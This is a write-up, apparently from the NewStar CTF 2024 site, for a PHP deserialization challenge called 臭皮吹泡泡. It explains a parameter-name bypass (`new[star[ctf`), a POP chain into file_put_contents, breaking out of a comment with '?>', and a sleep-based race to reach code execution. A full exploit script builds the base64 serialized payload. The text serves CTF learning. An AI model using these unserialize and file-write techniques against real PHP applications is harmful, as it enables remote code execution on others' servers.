---
titleTemplate: ":title | WriteUp - NewStar CTF 2024"
---

<script setup>
import Container from '@/components/docs/Container.vue'
</script>

# 臭皮吹泡泡

```php
<?php
error_reporting(0);
highlight_file(__FILE__);

class study
{
    public $study;

    public function __destruct()
    {
        if ($this->study == "happy") {
            echo ($this->study);
        }
    }
}
class ctf
{
    public $ctf;
    public function __tostring()
    {
        if ($this->ctf === "phpinfo") {
            die("u can't do this!!!!!!!");
        }
        ($this->ctf)(1);
        return "can can need";
    }
}
class let_me
{
    public $let_me;
    public $time;
    public function get_flag()
    {
        $runcode="<?php #".$this->let_me."?>";
        $tmpfile="code.php";
        try {
            file_put_contents($tmpfile,$runcode);
            echo ("we need more".$this->time);
            unlink($tmpfile);
        }catch (Exception $e){
            return "no!";
        }

    }
    public function __destruct(){
        echo "study ctf let me happy";
    }
}

class happy
{
    public $sign_in;

    public function __wakeup()
    {
        $str = "sign in ".$this->sign_in." here";
        return $str;
    }
}



$signin = $_GET['new_star[ctf'];
if ($signin) {
    $signin = base64_decode($signin);
    unserialize($signin);
}else{
    echo "你是真正的 CTF New Star 吗？让我看看你的能力";
}
```

在参数传递时，`[` 是非法变量名，会被 PHP 处理成 `_`，这导致我们无法直接传递想要的参数 `new_star[ctf`.

然而，php 这样的处理只会处理一次，在首次处理后不会继续处理随后的违规字符。

因此，当我们传递的参数是 `new[star[ctf` 的时候，php 会处理成 `new_star[ctf`，这样就成功传递了参数。

构建 POP 链的终点是 `let_me` 的 `get_flag()` 函数，这里可以进行文件写入。

```php
$runcode = "<?php #". $this->let_me . "?>";
$tmpfile = "code.php";
try {
    file_put_contents($tmpfile, $runcode); // [!code highlight]
    echo ("we need more" . $this->time);
    unlink($tmpfile);
} catch (Exception $e) {
    return "no!";
}
```

文件前后添加了字符 `<?php #` 和 `?>`，这会把我们写入的 php 代码注释掉，导致不能正常执行。

这里我们可以闭合 php 符号，从而执行 php 代码。

```php
<?php # ?> <?php echo("1");?>
```

这里我们将代码写入文件就会被立刻删除，所以我们需要找一个办法，使得文件存在的时间长一点。注意到：

```php
public $ctf;
public function __tostring()
{
    if ($this->ctf === "phpinfo") {
        die("u can't do this!!!!!!!");
    }

    ($this->ctf)(1); // [!code highlight]
    return "can can need";
}
```

这里可以构造一个 `sleep(1)`，使得文件存在的时间增加 1 秒，这样就可以完成条件竞争。

<Container type='quote'>

出完题目发现可以直接使用 `die(1)`，这样可以直接使得文件不会被删除就退出。
</Container>

构造脚本如下：

```php
<?php
error_reporting(0);
class study {
    public $study;
}
class ctf {
    public $ctf;
}
class let_me {
    public $let_me;
    public $time;
}

class happy {
    public $sign_in;
}
$payload  = new happy();
$payload ->sign_in = new ctf();
$exp = new let_me();
$exp->let_me="?> <?php phpinfo();";
$exp->time=new ctf();
$exp->time->ctf="sleep";
$payload ->sign_in->ctf = array($exp,"get_flag");
echo base64_encode(serialize($payload));
?>
```

发包后快速访问我们写入的 `code.php`，完成 RCE（或者写一个脚本访问，或者 BurpSuite 爆破）

![发包](/assets/images/wp/2024/week5/choupichuipaopao_1.png)

![查看 phpinfo](/assets/images/wp/2024/week5/choupichuipaopao_2.png)
